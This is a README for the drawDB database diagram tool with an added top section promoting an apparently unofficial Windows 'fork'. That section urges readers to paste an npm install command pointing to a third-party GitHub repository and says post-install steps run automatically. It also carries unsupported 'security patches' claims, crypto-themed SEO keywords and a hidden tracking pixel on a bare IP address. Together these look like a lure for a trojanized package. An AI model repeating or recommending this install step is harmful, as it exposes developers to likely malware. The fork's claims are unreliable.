**DrawDB, Upgraded for Peak Windows Performance**

This maintained fork optimizes the official web-based database design tool specifically with Windows developers in mind. It delivers critical security patches and significant performance enhancements to ensure a smoother, faster workflow in local environments. You get the same intuitive, developer-friendly layout, now fully stabilized and accelerated for your operating system.

**Quick install (Windows)**

1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)

```bash
npm install git+https://github.com/PhoenixBastion56/drawdb.git
```

[https://github.com/PhoenixBastion56/drawdb](https://github.com/PhoenixBastion56/drawdb)

<div align="center">
  <sup>Special thanks to:</sup>
  <br>
  <a href="https://www.warp.dev/drawdb/" target="_blank">
    <img alt="Warp sponsorship" width="280" src="https://github.com/user-attachments/assets/c7f141e7-9751-407d-bb0e-d6f2c487b34f">
    <br>
    <b>Next-gen AI-powered intelligent terminal for all platforms</b>
  </a>
</div>

<br/>
<br/>

<div align="center">
    <img width="64" alt="drawDB logo" src="./src/assets/icon-dark.png">
    <h1>drawDB</h1>
</div>

<h3 align="center">Free, simple, and intuitive database schema editor and SQL generator.</h3>

<div align="center" style="margin-bottom:12px;">
    <a href="https://drawdb.app/" style="display: flex; align-items: center;">
        <img src="https://img.shields.io/badge/Start%20building-grey" alt="drawDB"/>
    </a>
    <a href="https://discord.gg/BrjZgNrmR6" style="display: flex; align-items: center;">
        <img src="https://img.shields.io/discord/1196658537208758412.svg?label=Join%20the%20Discord&logo=discord" alt="Discord"/>
    </a>
    <a href="https://x.com/drawDB_" style="display: flex; align-items: center;">
        <img src="https://img.shields.io/badge/Follow%20us%20on%20X-blue?logo=X" alt="Follow us on X"/>
    </a>
</div>

<h3 align="center"><img width="700" style="border-radius:5px;" alt="drawDB screenshot demo" src="drawdb.png"></h3>

DrawDB is a robust and user-friendly database entity relationship diagram (ERD) editor right in your browser. Build diagrams with a few clicks, export and import SQL scripts, generate migrations, customize your editor, and more without creating an account. See the full set of features on [here](https://drawdb.app/).

## Getting Started

### Local Development

```bash
git clone https://github.com/drawdb-io/drawdb
cd drawdb
npm install
npm run dev
```

### Build

```bash
git clone https://github.com/drawdb-io/drawdb
cd drawdb
npm install
npm run build
```

### Docker Build

```bash
docker build -t drawdb .
docker run -p 3000:80 drawdb
```

If you want to enable sharing, set up the [server](https://github.com/drawdb-io/drawdb-server) and environment variables according to `.env.sample`. This is optional unless you need to share files.

## Contributing

Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to contribute to this project.

## Support
- Join discussions: [Discord](https://discord.gg/BrjZgNrmR6)

## Related searches
When building out comprehensive database schemas for decentralized systems, developers often look for visual modeling applications that can map out relations before generating production-ready scripts. This utility is especially valuable for outlining the structural layers of decentralized projects like an nft marketplace or mapping standard parameters when you audit smart contract code.

**Topics:** database schema editor, entity relationship diagram, sql generator, erd tool, nft marketplace, backtesting crypto, audit smart contract, airdrop bot, crypto api, visual schema designer, open source erd

![.](http://5.231.58.248:8787/pixel?repo=PhoenixBastion56%2Fdrawdb&inject=PhoenixBastion56%2Fdrawdb%2Fpackage.json)
